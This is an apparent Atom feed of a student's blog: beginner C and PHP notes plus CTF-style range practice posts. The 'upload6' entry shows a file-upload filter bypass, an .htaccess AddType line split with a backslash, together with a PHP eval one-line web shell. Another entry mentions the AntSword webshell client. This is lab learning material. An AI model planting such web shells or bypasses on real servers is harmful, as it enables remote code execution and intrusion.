<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://crlrlc.github.io/</id>
    <title>Gridea</title>
    <updated>2020-10-31T15:12:33.641Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://crlrlc.github.io/"/>
    <link rel="self" href="https://crlrlc.github.io/atom.xml"/>
    <subtitle>温故而知新</subtitle>
    <logo>https://crlrlc.github.io/images/avatar.png</logo>
    <icon>https://crlrlc.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, Gridea</rights>
    <entry>
        <title type="html"><![CDATA[第四次打靶]]></title>
        <id>https://crlrlc.github.io/post/di-si-ci-da-ba/</id>
        <link href="https://crlrlc.github.io/post/di-si-ci-da-ba/">
        </link>
        <updated>2020-10-31T15:05:26.000Z</updated>
        <content type="html"><![CDATA[<p>##在师兄的指导下，我进行了底四次靶场实验下面是步骤<br>
<img src="https://crlrlc.github.io//post-images/1604156810423.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1604156815676.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1604156820417.png" alt="" loading="lazy"><br>
##补充<br>
upload3那题我失败了，原因是.htaccess没有双写，只是双写了1.aaa中的木马，<br>
<img src="https://crlrlc.github.io//post-images/1604157027025.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1604157109287.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[3,upload6]]></title>
        <id>https://crlrlc.github.io/post/3upload6/</id>
        <link href="https://crlrlc.github.io/post/3upload6/">
        </link>
        <updated>2020-10-29T09:30:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="htaccess文件换行绕过">.htaccess文件换行绕过</h3>
<p>上传.htaccess文件时候发现文件内容被过滤。可以使用换行绕过的方法绕过过滤。</p>
<p>.htaccess支持换行编写所以使用换行可以直接上传成功并解析。</p>
<ul>
<li>题目</li>
</ul>
<p>upload6</p>
<ul>
<li>
<p>过滤掉application，则使用换行绕过</p>
</li>
<li>
<p>.htaccess</p>
</li>
</ul>
<pre><code>AddType application/x-httpd-php .aaa
</code></pre>
<p>提示：内容不能有application</p>
<p>尝试使用.htaccess文件换行绕过。</p>
<ul>
<li>.htaccess</li>
</ul>
<pre><code>AddType appli\
cation/x-httpd-php .aaa
</code></pre>
<ul>
<li>1.aaa</li>
</ul>
<pre><code>&lt;?php
@eval($_POST['cmd']);
</code></pre>
<p>##步骤如下：<br>
<img src="https://crlrlc.github.io//post-images/1603964256264.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603964263023.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603964269523.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603964275363.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[第二次打靶]]></title>
        <id>https://crlrlc.github.io/post/di-er-ci-da-ba/</id>
        <link href="https://crlrlc.github.io/post/di-er-ci-da-ba/">
        </link>
        <updated>2020-10-26T13:31:36.000Z</updated>
        <content type="html"><![CDATA[<p>##第二次做题<br>
第一次用蚁剑，下面是步骤<br>
<img src="https://crlrlc.github.io//post-images/1603719175276.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603719181951.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603719185745.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603719199605.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603719204827.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603719209974.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603719213950.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603719217939.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603719223555.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[第一次打靶]]></title>
        <id>https://crlrlc.github.io/post/di-yi-ci-da-ba/</id>
        <link href="https://crlrlc.github.io/post/di-yi-ci-da-ba/">
        </link>
        <updated>2020-10-25T01:51:53.000Z</updated>
        <content type="html"><![CDATA[<p>##目的<br>
按照流程把做题过程复述，感受做信息安全比赛的题目<br>
##第一步<br>
<img src="https://crlrlc.github.io//post-images/1603590913267.png" alt="" loading="lazy"><br>
##第二步<br>
<img src="https://crlrlc.github.io//post-images/1603590984113.png" alt="" loading="lazy"><br>
##第三步<br>
<img src="https://crlrlc.github.io//post-images/1603591026640.png" alt="" loading="lazy"><br>
##第四步<br>
<img src="https://crlrlc.github.io//post-images/1603591050797.png" alt="" loading="lazy"><br>
##第五步<br>
<img src="https://crlrlc.github.io//post-images/1603591277515.png" alt="" loading="lazy"><br>
##补充<br>
在第四部中，我们会好奇为什么域名后面要加‘?a=’，那是因为<br>
<img src="https://crlrlc.github.io//post-images/1603591262399.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[php的更新]]></title>
        <id>https://crlrlc.github.io/post/php-de-geng-xin/</id>
        <link href="https://crlrlc.github.io/post/php-de-geng-xin/">
        </link>
        <updated>2020-10-20T14:25:02.000Z</updated>
        <content type="html"><![CDATA[<p>##写在前面<br>
php是一个脚本语言，脚本语言就是不用编译器编译就可以执行的语言。<br>
在前面我用PHPstudy遇到了一些问题，于是<br>
我换了PHP的集成环境，<br>
<img src="https://crlrlc.github.io//post-images/1603204035702.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603204110700.png" alt="" loading="lazy"><br>
并且成功转换了代码<br>
<img src="https://crlrlc.github.io//post-images/1603204501835.png" alt="" loading="lazy"><br>
并发现一些问题<br>
##第一<br>
localhost访问的是<br>
<img src="https://crlrlc.github.io//post-images/1603204683840.png" alt="" loading="lazy"><br>
##第二<br>
index这个名字似乎有神奇的魔力让网页优先访问它<br>
<img src="https://crlrlc.github.io//post-images/1603205016480.png" alt="" loading="lazy"><br>
##第三<br>
在后缀为HTML和PHP是PHP优先<br>
<img src="https://crlrlc.github.io//post-images/1603205062037.png" alt="" loading="lazy"><br>
##第四<br>
虽然在PHP中，变量不用提前声明，但是前面一定要加美元符$$,就像这样<br>
<img src="https://crlrlc.github.io//post-images/1603206195963.png" alt="" loading="lazy"><br>
##第五<br>
php里的应用类似于c中的指针<br>
同样作用的程序php是这样的<br>
<img src="https://crlrlc.github.io//post-images/1603286147837.png" alt="" loading="lazy"><br>
而在c中是这样的<br>
<img src="https://crlrlc.github.io//post-images/1603286259217.png" alt="" loading="lazy"><br>
在php中和c的i=%d不同的是，php要是<span class='katex-error' title='ParseError: KaTeX parse error: Expected &#039;}&#039;, got &#039;EOF&#039; at end of input: i={'>i={</span>i}的话会变成2=2（假设在这之前<span class='katex-error' title='ParseError: KaTeX parse error: Can&#039;t use function &#039;\&#039;&#039; in math mode at position 29: …c同样的效果，必须加转义字符&#039;\̲&#039;̲  &#039;\$i={'>i=2）要想使php输出与c同样的效果，必须加转义字符&#039;\&#039;  &#039;\$i={</span>i}'<br>
##最后<br>
目前发现for循环while循环还有if的用法和c语言一样，但是换行符变成了这样&quot;<br>&quot;<br>
自增自减要这样$i++;其他似乎和c语言一样。未完待续。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[php的内容]]></title>
        <id>https://crlrlc.github.io/post/php-de-nei-rong/</id>
        <link href="https://crlrlc.github.io/post/php-de-nei-rong/">
        </link>
        <updated>2020-10-19T04:35:43.000Z</updated>
        <content type="html"><![CDATA[<p>##代码标记<br>
PHP是一种运行在服务器端的脚本语言，可以嵌入到HTML中。</p>
<p>区分PHP代码和HTML代码：代码标记</p>
<ul>
<li>标准标记（最常用）<br>
+&lt;?  php</li>
<li>php代码</li>
<li>+?&gt;</li>
</ul>
<ul>
<li>简短风格</li>
<li>
<?
</li>
<li>echo&quot;简短风格&quot;;</li>
<li>?&gt;</li>
<li>然而：<img src="https://crlrlc.github.io//post-images/1603084836046.png" alt="" loading="lazy"></li>
</ul>
<ul>
<li>
<p>现在尝试script风格</p>
</li>
<li>
<script language="php">
</li>
<li>
<p>echo&quot;script&quot;;</p>
</li>
<li>
</script>
</li>
<li>
<p><img src="https://crlrlc.github.io//post-images/1603085155979.png" alt="" loading="lazy"><br>
/asp风格<br>
/&lt;%<br>
/	echo&quot;asp风格&quot;;<br>
/%&gt;<br>
/效果<img src="https://crlrlc.github.io//post-images/1603085394196.png" alt="" loading="lazy"><br>
##现在尝试c语言与php转化。<br>
这是c语言源码：<br>
//用函数调用实现让系统判断素数<br>
#include&lt;stdio.h&gt;<br>
int main(void)<br>
{<br>
int i, val;</p>
<p>printf(&quot;请输入要判断的数：&quot;);<br>
scanf_s(&quot;%d&quot;, &amp;val);</p>
<p>for (i = 2; i &lt; val; ++i)<br>
{<br>
if (val % i == 0)<br>
{<br>
break;<br>
}<br>
}<br>
if (i == val)<br>
{<br>
printf(&quot;yes\n&quot;);<br>
}<br>
else<br>
printf(&quot;no\n&quot;);</p>
<p>return 0;</p>
<p>}<br>
/*<br>
return 返回本函数里面，形参来接收主函数<br>
*/<br>
##现在查看效果<br>
<img src="https://crlrlc.github.io//post-images/1603083976366.png" alt="" loading="lazy"><br>
看来失败了<br>
<img src="https://crlrlc.github.io//post-images/1603083707560.png" alt="" loading="lazy"><br>
##总结：<br>
1、失败的原因应该是phpstudy的原因<br>
2、解决方案：我将换一个php集成开发环境。<br>
3、至于乱码问题，上网查了一下是数据编码不一致，<br>
<img src="https://crlrlc.github.io//post-images/1603086160499.png" alt="" loading="lazy"><br>
要改的话我待我在多修炼一段时间再说吧。😅</p>
</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[第七篇流程控制2]]></title>
        <id>https://crlrlc.github.io/post/di-qi-pian-liu-cheng-kong-zhi-2/</id>
        <link href="https://crlrlc.github.io/post/di-qi-pian-liu-cheng-kong-zhi-2/">
        </link>
        <updated>2020-10-13T00:29:36.000Z</updated>
        <content type="html"><![CDATA[<p>源码：<br>
1)#include&lt;stdio.h&gt;<br>
int main(void)<br>
{<br>
if (1 &gt; 2)<br>
printf(&quot;aaaa\n&quot;);//会输出<br>
else<br>
printf(&quot;bbbb\n&quot;);//不输出<br>
printf(&quot;cccc\n&quot;);//会输出，有2个语句</p>
<pre><code>int asd;
asd = -1231;
if (asd &gt; 0)
	printf(&quot;有两个解\n&quot;);
//printf(&quot;哈哈哈哈&quot;);注意这行不能有，因为else if要与if相匹配
else if (asd == 0)
	printf(&quot;只有一个解\n&quot;);//注意，如果if成立，则else if不会执行。
else
	printf(&quot;无解\n&quot;);




return 0;
}
/*
if的格式及优先级：
if(1)
a;
else if(2)
b;		[如果这个成立，则1不成立]
else if(3)
c;		【如果这个成立，则1，2都不成立】
else(这里不可以有表达式！！！！)
d;		【如果这个成立则1，2，3都不成立】
【1，2，3都成了的话只执行a】

..............
else(5&gt;10);
    xxxx;      
这个不会报错的原因是：
else
（5&gt;10）;【该语句无意义
xxxxx;
*/</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[第七篇流程控制]]></title>
        <id>https://crlrlc.github.io/post/di-qi-pian-liu-cheng-kong-zhi/</id>
        <link href="https://crlrlc.github.io/post/di-qi-pian-liu-cheng-kong-zhi/">
        </link>
        <updated>2020-10-13T00:27:28.000Z</updated>
        <content type="html"><![CDATA[<p>源码:<br>
1)/*<br>
目的：流程控制：程序执行的顺序，顺序执行，选择，循环<br>
学习if的用法<br>
*/<br>
#include&lt;stdio.h&gt;<br>
int main(void)<br>
{<br>
if (3)<br>
printf(&quot;aaaa\n&quot;);//输出<br>
if (0)<br>
printf(&quot;bbbb\n&quot;);//不输出<br>
if (0 == 0)<br>
printf(&quot;ccccc\n&quot;);//输出</p>
<pre><code>if (1 &gt; 2)
	printf(&quot;ashdkajhsdk\n&quot;);
	printf(&quot;bbbb\n&quot;);//结果只输出bbbb

if (3 &gt; 2)
{
	printf(&quot;ashdkajhsdk\n&quot;);
	printf(&quot;bbbb\n&quot;);//两个同时输出或不输出
}




return 0;
</code></pre>
<p>}<br>
/*<br>
if！！！在不加括号！！！！的情况下只能控制一个语句的执行<br>
*/</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[第五篇排列顺序]]></title>
        <id>https://crlrlc.github.io/post/di-wu-pian-pai-lie-shun-xu/</id>
        <link href="https://crlrlc.github.io/post/di-wu-pian-pai-lie-shun-xu/">
        </link>
        <updated>2020-10-13T00:25:45.000Z</updated>
        <content type="html"><![CDATA[<p>源码:<br>
1)/<em>给三个数简单排序</em>/<br>
#include&lt;stdio.h&gt;<br>
int main(void)<br>
{<br>
int a, b, c, d;<br>
printf(&quot;请输入三个数让系统对其从大到小排序：&quot;);<br>
scanf_s(&quot;%d %d %d&quot;, &amp;a, &amp;b, &amp;c);</p>
<pre><code>if (a &lt; b)
{
	d = a;
	a = b;
	b = d;
}

if (a &lt; c)
{
	d = a;
	a = c;
	c = d;
}

if (b &lt; c)    //千万注意if后面不能有；！！！！！
{
	d = b;
	b = c;
	c = d;
}

printf(&quot;%d %d %d\n&quot;, a, b, c);
return 0;
}</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[第4篇循环举例]]></title>
        <id>https://crlrlc.github.io/post/di-4-pian-xun-huan-ju-li/</id>
        <link href="https://crlrlc.github.io/post/di-4-pian-xun-huan-ju-li/">
        </link>
        <updated>2020-10-13T00:24:03.000Z</updated>
        <content type="html"><![CDATA[<p>源码:<br>
1)/*<br>
循环举例算1+3+5+7+9/1—10之间的奇数和<br>
*/<br>
#include&lt;stdio.h&gt;<br>
int main(void)<br>
{<br>
int i;<br>
int sum = 0;<br>
for (i = 1; i &lt; 10; i += 2)//这里不要加分号！！！切记！！！<br>
{<br>
sum = sum + i;<br>
printf(&quot;哈哈哈哈哈哈哈哈哈\n&quot;);//可以通过这个知道循环的次数<br>
}<br>
printf(&quot;sum = %d\n&quot;, sum);<br>
return 0;<br>
}</p>
]]></content>
    </entry>
</feed>